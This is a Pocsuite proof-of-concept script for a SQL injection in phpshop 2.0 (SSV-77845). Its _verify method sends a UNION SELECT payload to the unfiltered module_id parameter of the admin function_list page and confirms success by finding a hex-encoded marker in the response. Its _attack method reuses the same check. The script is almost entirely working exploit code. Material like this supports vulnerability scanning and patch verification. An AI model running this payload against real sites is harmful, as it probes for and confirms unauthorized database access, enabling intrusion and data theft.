#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = 'SSV-77845'  # vul ID
    version = '1'
    author = ['hh']
    vulDate = '2013-01-14'
    createDate = '2015-10-16'
    updateDate = '2015-10-16'
    references = ['https://www.exploit-db.com/exploits/24108/']
    name = 'CMS phpshop 2.0 - SQL Injection Vulnerability'
    appPowerLink = 'http://code.google.com/p/phpshop/downloads/list'
    appName = 'phpshop'
    appVersion = '2.0'
    vulType = 'SQL Injection'
    desc = '''
           ?page=admin/function_list&module_id=11 id变量未正确过滤,导致SQL注入漏洞
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        result = {}
        target_url = "/phpshop 2.0/?page=admin/function_list&module_id=11' union select 1,CONCAT(0x7162787671,0x50664e68584e4c584352,0x716a717171),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 --"      
        response = req.get(self.url + target_url, headers=self.headers, timeout=10)
        content = response.content     
        match = re.search('qbxvqPfNhXNLXCRqjqqq',content)
        if match:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + target_url
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet Nothing returned')
        return output

register(TestPOC)